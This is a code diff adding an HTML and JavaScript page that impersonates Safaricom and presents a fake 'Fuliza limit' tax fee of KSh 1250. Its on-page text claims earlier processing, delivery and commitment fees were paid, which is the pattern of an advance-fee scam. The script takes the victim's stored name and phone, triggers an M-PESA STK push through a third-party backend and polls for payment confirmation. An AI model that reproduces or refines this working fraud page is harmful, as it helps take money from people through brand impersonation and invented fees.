@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Tax fee</title>
+
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap');
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    min-height:100vh;
+    background:#E8F7EF;
+font-family:'Mali',cursive;
+    color:#006B3F;
+}
+
+.container{
+    width:92%;
+    max-width:480px;
+    margin:auto;
+}
+
+.card{
+    background:#fff;
+    margin-top:24px;
+    padding:22px 18px;
+    border-radius:14px;
+    border:1px solid #B7E5CC;
+    box-shadow:0 3px 12px rgba(0,107,63,.08);
+}
+
+h1{
+    font-size:22px;
+    font-weight:700;
+    text-align:center;
+    margin:0 0 16px;
+    padding:12px 8px;
+    color:#fff;
+    background:#00A651;
+    border-radius:10px;
+}
+
+.status{
+    background:#E8F7EF;
+    color:#006B3F;
+    padding:14px 12px;
+    border-radius:12px;
+    font-family:'Mali', cursive !important;
+    font-size:14px;
+    font-weight:600;
+    line-height:1.7;
+    text-align:center;
+    margin-bottom:10px;
+    border:1px solid #B7E5CC;
+} 
+
+.customer{
+    background:#fff;
+    padding:15px;
+    border-radius:13px;
+    text-align:left;
+    font-family:Arial,sans-serif;
+    font-size:14px;
+    border:1px solid #00A651;
+    margin-bottom:15px;
+}
+
+.customer p{
+    margin:9px 0;
+    line-height:1.45;
+}
+
+.customer b{
+    color:#006B3F;
+}
+
+.customer span{
+    color:#006B3F;
+    font-weight:600;
+}
+
+.customer{
+    background:#fff;
+    padding:15px;
+    border-radius:13px;
+    text-align:left;
+    font-family:Arial,sans-serif;
+    font-size:14px;
+    border:1px solid #00A651;
+    margin-bottom:15px;
+}
+
+.customer p{
+    margin:9px 0;
+    line-height:1.45;
+}
+
+.customer b{
+    color:#006B3F;
+}
+
+.customer span{
+    color:#006B3F;
+    font-weight:600;
+}
+
+.amount{
+    background:#E8F7EF;
+    border:2px solid #00A651;
+    color:#006B3F;
+    padding:14px 12px;
+    border-radius:12px;
+    text-align:center;
+    font-family:'Mali',cursive;
+    font-size:18px;
+    font-weight:700;
+    margin-bottom:15px;
+} 
+
+button{
+    width:100%;
+    padding:15px;
+    margin-top:5px;
+    border:none;
+    border-radius:12px;
+    background:#00A651;
+    color:#fff;
+    font-family:'Mali',cursive;
+    font-size:20px;
+    font-weight:600;
+    cursor:pointer;
+    box-shadow:0 3px 10px rgba(0,166,81,.20);
+}
+
+button:disabled{
+    background:#00A651;
+    color:#fff;
+    cursor:not-allowed;
+    box-shadow:none;
+}
+
+#stkMessage{
+    min-height:20px;
+    margin-top:12px;
+    text-align:center;
+    font-family:Arial,sans-serif;
+    font-size:13px;
+    line-height:1.5;
+    color:#006B3F;
+}
+
+.notice{
+    margin-top:15px;
+    padding:12px;
+    border-radius:9px;
+    background:#006B3F;
+    color:#fff;
+    font-family:Arial,sans-serif;
+    font-size:12px;
+    line-height:1.5;
+    text-align:center;
+} 
+
+@media(max-width:360px){
+
+    body{
+        padding:10px 7px;
+    }
+
+    .card{
+        padding:18px 13px 15px;
+        border-radius:14px;
+    }
+
+    h1{
+        font-size:20px;
+    }
+
+    .customer{
+        padding:12px;
+    }
+
+    button{
+        padding:14px;
+        font-size:18px;
+    }
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="card">
+
+<h1>TAX FEE PAYMENT </h1>
+
+<div class="status">
+
+✓ Processing fee payment completed<br>
+✓ Delivery charges completed<br>
+✓ Commitment fee completed
+
+</div>
+
+<div class="info">
+Congratulations you're almost done with the payment what is remaining is for you to pay ksh 1250 for tax fee understand that your Fuliza new limit is subjected to taxation 
+</div>
+
+<div class="customer">
+
+<p>
+<b>Applicant:</b>
+<span id="fullName">Loading...</span>
+</p>
+
+<p>
+<b>Phone:</b>
+<span id="phone">Loading...</span>
+</p>
+
+</div>
+
+<div class="amount">
+
+Tax Fee: KSh 1250
+
+</div>
+
+<button
+    id="payBtn"
+    onclick="payNow()"
+>
+Pay Tax Fee
+</button>
+
+<p id="stkMessage"></p>
+
+<div class="notice">
+
+© 2026 Safaricom PLC. All rights reserved.
+
+</div>
+
+</div>
+
+</div>
+
+
+<script>
+
+const BACKEND =
+"https://fuliza-backend-1.onrender.com";
+
+const PROCESSING_FEE =
+1250;
+
+
+// ==========================================
+// LOAD CUSTOMER DETAILS
+// ==========================================
+
+const fullName =
+    localStorage.getItem("fullName") ||
+    sessionStorage.getItem("fullName") ||
+    "Applicant";
+
+localStorage.setItem("fullName", fullName); 
+const phone =
+    localStorage.getItem("phoneNumber") ||
+    localStorage.getItem("paymentPhone") ||
+    sessionStorage.getItem("activationPhone") ||
+    "";
+
+if (phone) {
+    localStorage.setItem("phoneNumber", phone);
+    localStorage.setItem("paymentPhone", phone);
+    sessionStorage.setItem("activationPhone", phone);
+}
+
+
+if (phone) {
+    localStorage.setItem("phoneNumber", phone);
+    sessionStorage.setItem("activationPhone", phone);
+}
+
+
+document.getElementById("fullName").textContent =
+    fullName;
+
+
+document.getElementById("phone").textContent =
+    phone || "Not available";
+
+
+// ==========================================
+// PAY FINAL SERVICE FEE
+// ==========================================
+
+async function payNow(){
+
+    const btn =
+        document.getElementById("payBtn");
+
+    const message =
+        document.getElementById("stkMessage");
+
+
+    if(!phone){
+
+        message.textContent =
+            "Phone number was not found.";
+
+        return;
+    }
+
+
+    btn.disabled = true;
+
+    btn.textContent =
+        "Sending STK Push...";
+
+    message.textContent =
+        "Please wait while we send the M-PESA payment request.";
+
+
+    try{
+
+        const response =
+            await fetch(
+                BACKEND + "/stk-push",
+                {
+                    method:"POST",
+
+                    headers:{
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body:JSON.stringify({
+
+                        phone:phone,
+
+                        amount:
+                            PROCESSING_FEE
+
+                    })
+                }
+            );
+
+
+        const data =
+            await response.json();
+
+
+        console.log(
+            "PAYLOR STK RESPONSE:",
+            data
+        );
+
+
+        if(
+            !response.ok ||
+            !data.success
+        ){
+
+            throw new Error(
+                data.message ||
+                "Payment request failed."
+            );
+
+        }
+
+
+        // ==================================
+        // GET TRANSACTION ID
+        // ==================================
+
+        const transactionId =
+            data.transactionId ||
+            data.checkout_request_id ||
+            data.data?.transactionId ||
+            data.data?.checkout_request_id;
+
+
+        if(!transactionId){
+
+            throw new Error(
+                "No transaction ID was returned."
+            );
+
+        }
+
+
+        console.log(
+            "TRANSACTION ID:",
+            transactionId
+        );
+
+
+        btn.textContent =
+            "Processing...";
+
+
+        message.textContent =
+            "STK Push sent. Please enter your M-PESA PIN. Payment confirmation will happen automatically.";
+
+
+        checkPayment(
+            transactionId
+        );
+
+
+    }catch(error){
+
+        console.error(
+            "STK ERROR:",
+            error
+        );
+
+
+        message.textContent =
+            error.message ||
+            "Unable to start payment.";
+
+
+        resetButton();
+
+    }
+
+}
+
+
+// ==========================================
+// CHECK PAYMENT STATUS
+// ==========================================
+
+function checkPayment(
+    transactionId
+){
+
+    let attempts = 0;
+
+    const maxAttempts = 40;
+
+
+    const interval =
+        setInterval(
+            async()=>{
+
+                attempts++;
+
+
+                if(
+                    attempts >
+                    maxAttempts
+                ){
+
+                    clearInterval(
+                        interval
+                    );
+
+
+                    document.getElementById(
+                        "stkMessage"
+                    ).textContent =
+                        "Payment confirmation is taking longer than expected. Please check your M-PESA messages before trying again.";
+
+
+                    resetButton();
+
+                    return;
+
+                }
+
+
+                try{
+
+                    const response =
+                        await fetch(
+                            BACKEND +
+                            "/payment-status",
+                            {
+                                method:"POST",
+
+                                headers:{
+                                    "Content-Type":
+                                        "application/json"
+                                },
+
+                                body:JSON.stringify({
+
+                                    transactionId:
+                                        transactionId
+
+                                })
+                            }
+                        );
+
+
+                    const result =
+                        await response.json();
+
+
+                    console.log(
+                        "PAYMENT STATUS:",
+                        result
+                    );
+
+
+                    if(!result.success){
+
+                        return;
+
+                    }
+
+
+                    const paymentStatus =
+                        String(
+                            result.status ||
+                            result.data?.status ||
+                            ""
+                        ).toLowerCase();
+
+
+                    // ==============================
+                    // PAYMENT COMPLETED
+                    // ==============================
+
+                    if(
+                        paymentStatus ===
+                            "completed" ||
+                        paymentStatus ===
+                            "success"
+                    ){
+
+                        clearInterval(
+                            interval
+                        );
+
+
+                        document.getElementById(
+                            "stkMessage"
+                        ).textContent =
+                            "Payment successful. Redirecting...";
+
+
+                        setTimeout(()=>{
+
+                            window.location.href =
+    "final.html";
+
+                        },1000);
+
+                    }
+
+
+                    // ==============================
+                    // PAYMENT FAILED
+                    // ==============================
+
+                    else if(
+                        paymentStatus ===
+                        "failed"
+                    ){
+
+                        clearInterval(
+                            interval
+                        );
+
+
+                        document.getElementById(
+                            "stkMessage"
+                        ).textContent =
+                            "Payment failed. Please try again.";
+
+
+                        resetButton();
+
+                    }
+
+
+                    // ==============================
+                    // PAYMENT CANCELLED
+                    // ==============================
+
+                    else if(
+                        paymentStatus ===
+                        "cancelled"
+                    ){
+
+                        clearInterval(
+                            interval
+                        );
+
+
+                        document.getElementById(
+                            "stkMessage"
+                        ).textContent =
+                            "Payment was cancelled.";
+
+
+                        resetButton();
+
+                    }
+
+                }catch(error){
+
+                    console.error(
+                        "STATUS ERROR:",
+                        error
+                    );
+
+                }
+
+            },
+            3000
+        );
+
+}
+
+
+// ==========================================
+// RESET BUTTON
+// ==========================================
+
+function resetButton(){
+
+    const btn =
+        document.getElementById(
+            "payBtn"
+        );
+
+    btn.disabled = false;
+
+    btn.textContent =
+        "Pay Processing Fee";
+
+}
+
+</script>
+
+</body>
+</html>
